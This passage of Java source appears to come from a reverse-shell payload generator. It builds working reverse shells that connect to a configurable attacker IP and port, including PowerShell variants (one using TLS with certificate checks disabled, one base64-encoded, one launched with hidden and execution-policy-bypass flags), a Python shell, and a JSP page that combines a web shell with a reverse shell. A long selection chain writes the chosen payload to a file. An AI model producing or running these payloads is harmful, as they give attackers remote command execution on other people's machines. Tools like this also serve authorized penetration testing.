    var Powershell_1 = "$LHOST = \""+ip+"\"; $LPORT = "+port+"; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); "
                   + "$StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);"
                   + " $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()";
    var Powershell_2 = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"+ip+"',"+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                     + "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
    var Powershell_3 = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('"+ip+"', "+port+");$NetworkStream = $TCPClient.GetStream();"
                     + "$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';"
                     + "while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"";
    var Powershell_4TLS = "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('"+ip+"', "+port+");$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));"
            + "         $SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');"
            + "         $StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()";
    String shell = "$client = New-Object System.Net.Sockets.TCPClient(\""+ip+"\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
    var base64shell = Base64.getEncoder().encodeToString(shell.getBytes());
    var powershell_base64 = "powershell -e "+ base64shell;
    var Python3_Windows = "import os,socket,subprocess,threading;\n" +
                          "def s2p(s, p):\n" +
                          "    while True:\n" +
                          "        data = s.recv(1024)\n" +
                          "        if len(data) > 0:\n" +
                          "            p.stdin.write(data)\n" +
                          "            p.stdin.flush()\n" +
                          "\n" +
                          "def p2s(s, p):\n" +
                          "    while True:\n" +
                          "        s.send(p.stdout.read(1))\n" +
                          "\n" +
                          "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
                          "s.connect((\""+ip+"\","+port+"))\n" +
                          "\n" +
                          "p=subprocess.Popen([\"sh\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n" +
                          "\n" +
                          "s2p_thread = threading.Thread(target=s2p, args=[s, p])\n" +
                          "s2p_thread.daemon = True\n" +
                          "s2p_thread.start()\n" +
                          "\n" +
                          "p2s_thread = threading.Thread(target=p2s, args=[s, p])\n" +
                          "p2s_thread.daemon = True\n" +
                          "p2s_thread.start()\n" +
                          "\n" +
                          "try:\n" +
                          "    p.wait()\n" +
                          "except KeyboardInterrupt:\n" +
                          "    s.close()";
    var Java_twoway = "<%\n" +
                      "    /*\n" +
                      "     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\n" +
                      "     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\n" +
                      "     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \n" +
                      "     * the command specified in the HTML form). This is to avoid to keep it simple.\n" +
                      "     */\n" +
                      "%>\n" +
                      "\n" +
                      "<%@page import=\"java.lang.*\"%>\n" +
                      "<%@page import=\"java.io.*\"%>\n" +
                      "<%@page import=\"java.net.*\"%>\n" +
                      "<%@page import=\"java.util.*\"%>\n" +
                      "\n" +
                      "<html>\n" +
                      "<head>\n" +
                      "    <title>jrshell</title>\n" +
                      "</head>\n" +
                      "<body>\n" +
                      "<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\n" +
                      "    <input TYPE=\"text\" NAME=\"shell\">\n" +
                      "    <input TYPE=\"submit\" VALUE=\"Send\">\n" +
                      "</form>\n" +
                      "<pre>\n" +
                      "<%\n" +
                      "    // Define the OS\n" +
                      "    String shellPath = null;\n" +
                      "    try\n" +
                      "    {\n" +
                      "        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n" +
                      "            shellPath = new String(\"/bin/sh\");\n" +
                      "        } else {\n" +
                      "            shellPath = new String(\"cmd.exe\");\n" +
                      "        }\n" +
                      "    } catch( Exception e ){}\n" +
                      "    // INNER HTML PART\n" +
                      "    if (request.getParameter(\"shell\") != null) {\n" +
                      "        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\n" +
                      "        Process p;\n" +
                      "        if (shellPath.equals(\"cmd.exe\"))\n" +
                      "            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\n" +
                      "        else\n" +
                      "            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\n" +
                      "        OutputStream os = p.getOutputStream();\n" +
                      "        InputStream in = p.getInputStream();\n" +
                      "        DataInputStream dis = new DataInputStream(in);\n" +
                      "        String disr = dis.readLine();\n" +
                      "        while ( disr != null ) {\n" +
                      "            out.println(disr);\n" +
                      "            disr = dis.readLine();\n" +
                      "        }\n" +
                      "    }\n" +
                      "    // TCP PORT PART\n" +
                      "    class StreamConnector extends Thread\n" +
                      "    {\n" +
                      "        InputStream wz;\n" +
                      "        OutputStream yr;\n" +
                      "        StreamConnector( InputStream wz, OutputStream yr ) {\n" +
                      "            this.wz = wz;\n" +
                      "            this.yr = yr;\n" +
                      "        }\n" +
                      "        public void run()\n" +
                      "        {\n" +
                      "            BufferedReader r  = null;\n" +
                      "            BufferedWriter w = null;\n" +
                      "            try\n" +
                      "            {\n" +
                      "                r  = new BufferedReader(new InputStreamReader(wz));\n" +
                      "                w = new BufferedWriter(new OutputStreamWriter(yr));\n" +
                      "                char buffer[] = new char[8192];\n" +
                      "                int length;\n" +
                      "                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\n" +
                      "                {\n" +
                      "                    w.write( buffer, 0, length );\n" +
                      "                    w.flush();\n" +
                      "                }\n" +
                      "            } catch( Exception e ){}\n" +
                      "            try\n" +
                      "            {\n" +
                      "                if( r != null )\n" +
                      "                    r.close();\n" +
                      "                if( w != null )\n" +
                      "                    w.close();\n" +
                      "            } catch( Exception e ){}\n" +
                      "        }\n" +
                      "    }\n" +
                      " \n" +
                      "    try {\n" +
                      "        Socket socket = new Socket( \""+ip+"\", "+port+" ); // Replace with wanted ip and port\n" +
                      "        Process process = Runtime.getRuntime().exec( shellPath );\n" +
                      "        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\n" +
                      "        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\n" +
                      "        out.println(\"port opened on \" + socket);\n" +
                      "     } catch( Exception e ) {}\n" +
                      "%>\n" +
                      "</pre>\n" +
                      "</body>\n" +
                      "</html>";
    
     
            
            
     if(ShellName.equalsIgnoreCase("bash"))
     {Write(PATH,bash);}
     else if (ShellName.equalsIgnoreCase("bash_udp"))
     {Write(PATH,bash_udp);}
     else if (ShellName.equalsIgnoreCase("bash_196"))
     {Write(PATH,bash_196);}
     else if (ShellName.equalsIgnoreCase("bash_read_line"))
     {Write(PATH,bash_read_line);}
     if(ShellName.equalsIgnoreCase("bash_5"))
     {Write(PATH,bash_5);}
     else if (ShellName.equalsIgnoreCase("nc_mkfifo"))
     {Write(PATH,nc_mkfifo);}
     else if (ShellName.equalsIgnoreCase("nc_e"))
     {Write(PATH,nc_e);}
     else if (ShellName.equalsIgnoreCase("busybox"))
     {Write(PATH,busybox);}
     if(ShellName.equalsIgnoreCase("nc_c"))
     {Write(PATH,nc_c);}
     else if (ShellName.equalsIgnoreCase("ncat_e"))
     {Write(PATH,ncat_e);}
     else if (ShellName.equalsIgnoreCase("ncat_udp"))
     {Write(PATH,ncat_udp);}
     else if (ShellName.equalsIgnoreCase("curl"))
     {Write(PATH,curl);}
     if(ShellName.equalsIgnoreCase("rustcat"))
     {Write(PATH,rustcat);}
     else if (ShellName.equalsIgnoreCase("C"))
     {Write(PATH,C);}
     else if (ShellName.equalsIgnoreCase("C_sharp"))
     {Write(PATH,C_sharp);}
     else if (ShellName.equalsIgnoreCase("C_sharp_bash"))
     {Write(PATH,C_sharp_bash);}
     else if (ShellName.equalsIgnoreCase("haskell_1"))
     {Write(PATH,haskell_1);}
     else if (ShellName.equalsIgnoreCase("perl"))
     {Write(PATH,perl);}
     else if (ShellName.equalsIgnoreCase("perl_no_sh"))
     {Write(PATH,perl_no_sh);}
     else if (ShellName.equalsIgnoreCase("perl_PTMonkey"))
     {Write(PATH,perl_PTMonkey);}
     else if (ShellName.equalsIgnoreCase("php_exec"))
     {Write(PATH,php_exec);}
     else if (ShellName.equalsIgnoreCase("php_shell_exec"))
     {Write(PATH,php_shell_exec);}
     else if (ShellName.equalsIgnoreCase("php_PTMonkey"))
     {Write(PATH,php_PTMonkey);}
     else if (ShellName.equalsIgnoreCase("php_system"))
     {Write(PATH,php_system);}
     else if (ShellName.equalsIgnoreCase("php_passthru"))
     {Write(PATH,php_passthru);}
     else if (ShellName.equalsIgnoreCase("php_popen"))
     {Write(PATH,php_popen);}
     else if (ShellName.equalsIgnoreCase("php_proc_open"))
     {Write(PATH,php_proc_open);}
     else if (ShellName.equalsIgnoreCase("Python_1"))
     {Write(PATH,Python_1);}
     else if (ShellName.equalsIgnoreCase("Python_2"))
     {Write(PATH,Python_2);}
     else if (ShellName.equalsIgnoreCase("Python3_1"))
     {Write(PATH,Python3_1);}
     else if (ShellName.equalsIgnoreCase("Python3_2"))
     {Write(PATH,Python3_2);}
     else if (ShellName.equalsIgnoreCase("Ruby"))
     {Write(PATH,Ruby);}
     else if (ShellName.equalsIgnoreCase("Ruby_no_sh"))
     {Write(PATH,Ruby_no_sh);}
     else if (ShellName.equalsIgnoreCase("socat"))
     {Write(PATH,socat);}
     else if (ShellName.equalsIgnoreCase("socat_TTY"))
     {Write(PATH,socat_TTY);}
     else if (ShellName.equalsIgnoreCase("sqlite3"))
     {Write(PATH,sqlite3);}
     else if (ShellName.equalsIgnoreCase("nodejs"))
     {Write(PATH,nodejs);}
     else if (ShellName.equalsIgnoreCase("nodejs2"))
     {Write(PATH,nodejs2);}
     else if (ShellName.equalsIgnoreCase("Java1"))
     {Write(PATH,Java1);}
     else if (ShellName.equalsIgnoreCase("Java2"))
     {Write(PATH,Java2);}
     else if (ShellName.equalsIgnoreCase("Java3"))
     {Write(PATH,Java3);}
     else if (ShellName.equalsIgnoreCase("Javascript"))
     {Write(PATH,Javascript);}
     else if (ShellName.equalsIgnoreCase("telnet"))
     {Write(PATH,telnet);}
     else if (ShellName.equalsIgnoreCase("zsh"))
     {Write(PATH,zsh);}
     else if (ShellName.equalsIgnoreCase("Lua1"))
     {Write(PATH,Lua1);}
     else if (ShellName.equalsIgnoreCase("Lua2"))
     {Write(PATH,Lua2);}
     else if (ShellName.equalsIgnoreCase("Golang"))
     {Write(PATH,Golang);}
     else if (ShellName.equalsIgnoreCase("Vlang"))
     {Write(PATH,Vlang);}
     else if (ShellName.equalsIgnoreCase("Awk"))
     {Write(PATH,Awk);}
     else if (ShellName.equalsIgnoreCase("Dart"))
     {Write(PATH,Dart);}
     else if (ShellName.equalsIgnoreCase("Crystal_System"))
     {Write(PATH,Crystal_System);}
     else if (ShellName.equalsIgnoreCase("Crystal_Code"))
     {Write(PATH,Crystal_Code);}
     //Windows 
     
     else if (ShellName.equalsIgnoreCase("nc_exe_e"))
     {Write(PATH,nc_exe_e);}
     else if (ShellName.equalsIgnoreCase("ncat_exe_e"))
     {Write(PATH,ncat_exe_e);}
     else if (ShellName.equalsIgnoreCase("C_windows"))
     {Write(PATH,C_windows);}
     else if (ShellName.equalsIgnoreCase("Windows_ConPty"))
     {Write(PATH,Windows_ConPty);}
     else if (ShellName.equalsIgnoreCase("Powershell_1"))
     {Write(PATH,Powershell_1);}
     else if (ShellName.equalsIgnoreCase("Powershell_2"))
     {Write(PATH,Powershell_2);}
     else if (ShellName.equalsIgnoreCase("Powershell_3"))
     {Write(PATH,Powershell_3);}
     else if (ShellName.equalsIgnoreCase("Powershell_4TLS"))
     {Write(PATH,Powershell_4TLS);}
     else if (ShellName.equalsIgnoreCase("powershell_base64"))
     {Write(PATH,powershell_base64);}
     else if (ShellName.equalsIgnoreCase("Python3_Windows"))
     {Write(PATH,Python3_Windows);}
     else if (ShellName.equalsIgnoreCase("Java_twoway"))
     {Write(PATH,Java_twoway);}
     
    }    
}  
